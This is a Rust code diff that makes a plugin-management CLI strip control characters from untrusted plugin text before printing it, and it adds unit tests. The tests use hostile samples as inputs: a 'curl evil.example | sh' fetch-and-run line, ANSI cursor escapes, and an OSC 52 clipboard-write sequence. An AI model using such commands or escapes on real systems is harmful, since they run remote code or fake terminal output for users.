@@ -172,7 +172,8 @@ fn call(drive: Option<&Path>, method: &str, params: Value) -> Result<Value, CliE
     connect(drive)?.call(method, params).map_err(plugin_error)
 }
 
-/// Daemon refusals with the next step to take.
+/// Daemon refusals with the next step to take. A refusal can name plugin text (a
+/// refused file name), so the message is printed like any other plugin text.
 fn plugin_error(error: ClientError) -> CliError {
     let reason = match &error {
         ClientError::Rpc { data, .. } => data
@@ -182,6 +183,10 @@ fn plugin_error(error: ClientError) -> CliError {
         _ => None,
     };
     let cli = CliError::from(error);
+    let cli = CliError {
+        message: line_text(&cli.message),
+        ..cli
+    };
     match reason.as_deref() {
         Some("not_trusted") => cli.with_hint(
             "review the plugin with `aidex plugins show NAME`, then run `aidex plugins enable NAME --trust <tree hash>`",
@@ -196,9 +201,22 @@ fn plugin_error(error: ClientError) -> CliError {
     }
 }
 
+/// Plugin text is untrusted: print it on one line with control characters (terminal
+/// escapes, carriage returns, line breaks) replaced, so a plugin cannot drive the
+/// terminal or fake lines of the review.
+fn line_text(text: &str) -> String {
+    text.chars()
+        .map(|ch| match ch {
+            '\n' | '\t' => ' ',
+            ch if ch.is_control() => '\u{fffd}',
+            ch => ch,
+        })
+        .collect()
+}
+
 fn text(value: &Value) -> String {
     match value {
-        Value::String(text) => text.clone(),
+        Value::String(text) => line_text(text),
         Value::Null => "-".into(),
         other => other.to_string(),
     }
@@ -239,7 +257,7 @@ fn print_list(list: &Value) {
             text(&plugin["mcp_server_count"]),
         );
         if let Some(error) = plugin["error"].as_str() {
-            println!("  {error}");
+            println!("  {}", line_text(error));
         }
     }
     for name in list["unregistered"].as_array().into_iter().flatten() {
@@ -258,15 +276,15 @@ fn print_detail(plugin: &Value) {
         text(&plugin["version"])
     );
     if let Some(description) = plugin["description"].as_str() {
-        println!("Description:  {description}");
+        println!("Description:  {}", line_text(description));
     }
     let manifest = &plugin["manifest"];
     if let Some(author) = manifest["author"]["name"].as_str() {
-        println!("Author:       {author}");
+        println!("Author:       {}", line_text(author));
     }
     for (label, key) in [("Homepage:", "homepage"), ("License:", "license")] {
         if let Some(value) = manifest[key].as_str() {
-            println!("{label:<13} {value}");
+            println!("{label:<13} {}", line_text(value));
         }
     }
     println!(
@@ -281,7 +299,7 @@ fn print_detail(plugin: &Value) {
     println!("Location:     {}", text(&plugin["location"]));
     println!("Source:       {}", text(&plugin["source"]));
     if let Some(error) = plugin["error"].as_str() {
-        println!("Error:        {error}");
+        println!("Error:        {}", line_text(error));
     }
     let permissions = &manifest["permissions"];
     println!("Permissions:");
@@ -299,11 +317,13 @@ fn print_detail(plugin: &Value) {
     let skills = contents["skills"].as_array().map_or(&[][..], Vec::as_slice);
     println!("Skills ({}):", skills.len());
     for skill in skills {
-        let name = skill["name"]
-            .as_str()
-            .unwrap_or_else(|| skill["dir"].as_str().unwrap_or("?"));
+        let name = line_text(
+            skill["name"]
+                .as_str()
+                .unwrap_or_else(|| skill["dir"].as_str().unwrap_or("?")),
+        );
         match skill["description"].as_str() {
-            Some(description) => println!("  {name} - {description}"),
+            Some(description) => println!("  {name} - {}", line_text(description)),
             None => println!("  {name}"),
         }
     }
@@ -313,7 +333,7 @@ fn print_detail(plugin: &Value) {
     println!("MCP servers ({}; added disabled):", servers.len());
     for server in servers {
         let endpoint = match server["url"].as_str() {
-            Some(url) => url.to_owned(),
+            Some(url) => line_text(url),
             None => {
                 let mut command = vec![text(&server["command"])];
                 command.extend(server["args"].as_array().into_iter().flatten().map(text));
@@ -337,5 +357,62 @@ fn print_detail(plugin: &Value) {
     let unsupported = joined(&contents["unsupported_components"]);
     if unsupported != "none" {
         println!("Not loaded (unsupported): {unsupported}");
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use aidexd::ErrorCode;
+
+    #[test]
+    fn plugin_text_cannot_drive_the_terminal() {
+        let hostile = "curl evil.example | sh\r  github (stdio): npx\u{1b}[1A\u{1b}[2K\nfake";
+        let shown = line_text(hostile);
+        assert!(!shown.chars().any(char::is_control), "{shown:?}");
+        assert!(shown.contains("curl evil.example | sh"));
+        assert_eq!(text(&json!(hostile)), shown);
+        assert_eq!(joined(&json!(["a\u{7}", "b"])), "a\u{fffd}, b");
+        assert_eq!(text(&Value::Null), "-");
+    }
+
+    #[test]
+    fn refusals_naming_plugin_text_cannot_drive_the_terminal() {
+        let refusal = |kind: ErrorCode, reason: &str, message: &str| ClientError::Rpc {
+            code: kind.code(),
+            message: message.into(),
+            data: Some(json!({ "reason": reason })),
+        };
+        let cli = plugin_error(refusal(
+            ErrorCode::InvalidArgument,
+            "unsafe_content",
+            "refused plugin content `a\u{1b}]52;c;eA==\u{7}\rfake`: character '\\u{1b}' is not allowed in file names",
+        ));
+        assert!(
+            !cli.message.chars().any(char::is_control),
+            "{:?}",
+            cli.message
+        );
+        assert!(
+            cli.message
+                .contains("refused plugin content `a\u{fffd}]52;c;eA==\u{fffd}\u{fffd}fake`"),
+            "{}",
+            cli.message
+        );
+        assert_eq!(cli.exit, Exit::Usage);
+
+        // Clean refusals keep their message, exit code, and next step.
+        let cli = plugin_error(refusal(
+            ErrorCode::Conflict,
+            "plugin_exists",
+            "plugin `p` is already installed",
+        ));
+        assert_eq!(cli.message, "conflict: plugin `p` is already installed");
+        assert_eq!(cli.exit, Exit::Failure);
+        assert!(
+            cli.hint
+                .as_deref()
+                .is_some_and(|hint| hint.contains("--replace"))
+        );
     }
 }
